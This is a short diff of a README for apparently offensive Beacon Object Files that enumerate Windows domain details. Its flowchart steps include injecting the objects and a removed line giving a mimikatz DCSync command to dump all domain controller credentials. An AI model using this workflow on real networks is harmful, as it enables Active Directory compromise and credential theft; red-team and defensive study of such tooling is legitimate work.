@@ -1,4 +1,4 @@
-# CobaltStrike BOF :
+# BOF :
 This is a BOF to return Domain Forest Name, Domain Name, Domain Controller, address, sitename 
 
 
@@ -12,8 +12,7 @@ Instructions for completing flowchart
 Step 1) We need the domain of windows computer.
     Inject get_domain_info.o without arguments
 
-Step 2) Attempt to retrieve domain controller credentials using mimikatz
-    mimikatz lsadump::dcsync /domain:<DOMAIN NAME> /all /csv
+Step 2) Attempt to retrieve dc credentials by dcsync
 
 Step 3) Get a list of all network groups
     Inject get_net_groups.o with the following arguments ("<DOMAIN>")
